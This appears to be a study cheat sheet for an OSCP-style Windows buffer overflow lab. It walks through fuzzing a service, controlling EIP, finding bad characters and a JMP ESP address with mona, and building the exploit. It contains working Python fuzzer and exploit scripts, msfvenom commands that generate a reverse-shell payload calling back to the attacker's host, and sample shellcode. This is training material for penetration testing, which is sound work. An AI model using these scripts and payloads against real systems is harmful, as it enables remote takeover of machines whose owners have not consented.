# Buffer overflows

## Immunity Debugger

1. start as administrator
2. Either open file or go o File>Attach to select process
3. Run Program (F9)
4. Step Into (F7)
5. Execute till return (Ctrl+F9)
6. You need to insert the code to crash the application into an input field like username or password
7. Remember that after each crash of the application you might need to start/restart the application

## Mona configuration



The mona script has been preinstalled, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:\


```
!mona config -set workingfolder c:\mona\%p
```

## Fuzzing

If you not know the listening port of the vulnerable application

1. You can use Wireshark/Burp to find the http connection details.
2. Find the process and the port it is listening on to attach it to Immunity debugger. - (netstat -a -b)

Create a file on your Kali box called fuzzer.py with the following contents:

```
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.172.143"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

Run the fuzzer.py script using python: `python3 fuzzer.py`

## Crash Replication & Controlling EIP

Create another file on your Kali box called exploit.py with the following contents:

```
import socket

ip = "10.10.172.143"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

\


Run the following command to generate a cyclic pattern of a length 400 bytes longer that the string that crashed the server (change the -l value to this):

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l X+400`

or you can use this one

Msf-pattern\_create -l 800

Copy the output and place it into the payload variable of the exploit.py script.

On Windows, in Immunity Debugger, re-open the oscp.exe again using the same method as before, and click the red play icon to get it running. You will have to do this prior to each time we run the exploit.py (which we will run multiple times with incremental modifications).

The script should crash the oscp.exe server again. This time, in Immunity Debugger, in the command input box at the bottom of the screen, run the following mona command, changing the distance to the same length as the pattern you created:

`!mona findmsp -distance 600`

or you can use&#x20;

Msf-pattern\_offset -l 800 -q 42306142

Mona should display a log window with the output of the command. If not, click the "Window" menu and then "Log data" to view it (choose "CPU" to switch back to the standard view).

In this output you should see a line which states:

`EIP contains normal pattern : ... (offset XXXX)`

Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".

Restart oscp.exe in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B's (e.g. 42424242).

## Finding Bad Characters

Generate a bytearray using mona, and exclude the null byte (\x00) by default. Note the location of the bytearray.bin file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be C:\mona\oscp\bytearray.bin).

`!mona bytearray -b "\x00"`

`!mona bytearray -cpb "\x00"`\


Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \x01 to \xff:

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

\


Update your exploit.py script and set the payload variable to the string of bad chars the script generates.

Restart oscp.exe in Immunity and run the modified exploit.py script again. Make a note of the address to which the ESP register points and use it in the following mona command:

`!mona compare -f C:\mona\oscp\bytearray.bin -a <address>`

A popup window should appear labelled "mona Memory comparison results". If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.

Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.

The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with \x00. Then update the payload variable in your exploit.py script and remove the new badchars as well.

Restart oscp.exe in Immunity and run the modified exploit.py script again. Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.

## Finding a Jump Point

### Mona

With the application either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):\


`!mona jmp -r esp -cpb "\x00"`

{% hint style="info" %}
`make sure that the jump point does not include bad chars!!!`
{% endhint %}

This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log data" window (use the Window menu to switch to it if needed).

Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.



### PWK

1. !mona modules
2. locate nasm\_shell
3. /usr/share/metasploit-framework/tools/exploit/nasm\_shell.rb
4. nasm > JMP ESP
5. !mona find -s "\xff\xe4" -m essfunc.dll
6. add JMP  address to exploit
7. you can use a breakpoint to see it reachs the address

With mona to find a JMP ESP

`!mona jmp -r ESP -m "essfunc.dll"`

## Generate Payload



Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):\


`msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c`

`msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c -a x86`\


Copy the generated C code strings and integrate them into your exploit.py script payload variable using the following notation:\


```
payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"
...
"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"
"\x19\x53\xd0\x92\x19\x53\x2e\x1d")
```

## Prepend NOPs

Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:

```
padding = "\x90" * 16
```

## Exploit!

{% hint style="info" %}
[https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)
{% endhint %}
